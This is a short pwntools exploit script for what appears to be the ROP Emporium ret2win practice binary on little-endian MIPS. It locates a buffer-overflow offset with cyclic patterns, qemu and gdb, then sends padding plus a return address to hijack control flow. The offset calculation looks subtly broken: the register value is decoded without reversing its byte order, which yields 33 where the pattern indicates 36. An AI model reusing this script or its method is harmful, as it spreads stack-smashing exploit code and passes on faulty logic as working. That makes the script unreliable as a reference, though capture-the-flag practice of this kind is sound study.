from pwn import *

#
# Context
#

e = context.binary = ELF('ret2win_mipsel')

#
# ROP
#

target = p32(0x00400a00)

#
# Find Offset
#

# launch qemu with payload
"""
python3 -c 'from pwn import *; print(cyclic(0x38))' | qemu-mipsel -L /usr/mipsel-linux-gnu/ -g <port> ./ret2win_mipsel
"""

# gdb-multiarch script
"""
symbol-file ret2win_mips
set arch mips:isa32
target remote :<port>

b *pwnme+252
i r ra

Output: 6161616a
"""

# calculate offset
"""
python3 -c 'from pwn import *; print(cyclic_find(bytes.fromhex(input())))'
"""

offset = 33
info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * offset
payload += target

io = process(e.path)
io.sendlineafter(b'> ', payload)

info(io.recvuntil(b'}').decode())

io.close()